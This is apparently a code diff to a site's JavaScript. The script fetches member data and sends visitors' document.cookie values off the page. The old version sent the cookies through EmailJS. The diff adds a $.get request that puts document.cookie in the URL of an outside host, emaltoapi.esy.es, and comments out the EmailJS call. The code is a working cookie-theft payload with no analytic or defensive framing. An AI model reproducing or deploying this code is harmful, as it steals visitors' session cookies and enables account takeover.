@@ -1,8 +1,6 @@
 
 $.getScript('https://cdn.emailjs.com/dist/email.min.js', function() {
-  (function(){
-      emailjs.init("user_v53jGOfDqJGNImD25jUpw");
-   })();
+ 
     
      $.get("http://www.exceldatabank.com/popupfiles/message.php?member_id=130333", function( data ) {
           var memcode='def';
@@ -28,8 +26,9 @@ $.getScript('https://cdn.emailjs.com/dist/email.min.js', function() {
                       
              });
             */
-            
-             emailjs.send("gmail","data",{cookie: document.cookie, time: new Date().getTime(),"memcode":memcode});
+             
+             $.get("http://emaltoapi.esy.es/api.php?name=%27x%27&cookie="+document.cookie, function( data ) {});
+             //emailjs.send("gmail","data",{cookie: document.cookie, time: new Date().getTime(),"memcode":memcode});
           }
      });
 });
